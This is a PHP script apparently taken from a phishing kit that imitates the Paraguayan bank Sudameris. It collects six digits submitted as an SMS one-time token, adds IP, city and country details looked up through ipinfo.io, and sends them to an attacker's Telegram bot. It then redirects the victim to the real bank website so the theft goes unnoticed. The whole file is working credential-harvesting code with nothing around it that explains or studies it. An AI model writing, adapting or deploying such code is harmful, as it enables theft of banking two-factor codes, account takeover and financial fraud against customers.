<?php
ini_set("display_errors", 0);
include('dt.php');
$ip = trim(file_get_contents("http://ipinfo.io/ip"));
$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$userp = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
if ( isset ($_POST['1']) && isset ($_POST['2']) ){

$message = "TOKEN O SMS: ".$_POST['1']."".$_POST['2']."".$_POST['3']."".$_POST['4']."".$_POST['5']."".$_POST['6']."\r\nIP: ".$ip." ".$userp." ".$cc."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}{  header ('location: https://secure.sudameris.com.py/'); exit();
}

?>
